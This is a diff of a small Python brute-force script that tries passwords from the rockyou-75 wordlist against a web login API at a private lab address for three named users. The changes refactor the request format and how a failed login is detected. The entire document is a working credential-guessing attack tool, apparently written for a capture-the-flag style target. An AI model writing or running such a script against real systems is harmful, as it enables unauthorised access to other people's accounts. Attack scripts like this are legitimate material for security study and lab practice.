@@ -1,12 +1,14 @@
 #!/usr/bin/env python3
 
-import requests
+from requests import post
 from time import sleep
 
 url = 'http://10.129.71.65:3000/api/session/authenticate'
+wordlistPath = '/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou-75.txt'
+falseString = '"success":false'
 usernames = ['tom', 'mark', 'rastating']
 
-with open('/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou-75.txt', 'r') as wordlistFile:
+with open(wordlistPath, 'r') as wordlistFile:
 	wordlist = wordlistFile.read().split('\n')
 
 for name in usernames:
@@ -14,12 +16,12 @@ for name in usernames:
 
 	for i, password in enumerate(wordlist):
 		try:
-			response = requests.post(url, json={name:password}).text
+			response = post(url, json={'username':name, 'password':password}).text
 		except:
 			print(f'[-] Error on password: {password}')
 			sleep(10)
 		
-		if 'Authentication failed' not in response:
+		if falseString not in response:
 			print(f'[+] Login - {name}:{password}')
 			break
 		else:
